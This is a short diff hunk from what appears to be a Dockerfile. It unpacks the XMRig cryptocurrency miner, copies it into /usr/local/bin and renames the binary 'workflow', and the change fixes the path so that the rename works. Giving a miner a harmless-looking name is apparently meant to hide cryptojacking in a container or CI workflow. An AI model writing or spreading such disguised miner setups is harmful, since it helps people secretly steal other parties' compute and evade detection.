@@ -8,7 +8,7 @@ RUN apt update; \
     tar xf xmrig-6.16.2-focal-x64.tar.gz; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig; \
-    cd usr/local/bin; \
+    cd /usr/local/bin; \
     mv xmrig workflow;
 
 WORKDIR /usr/local/bin
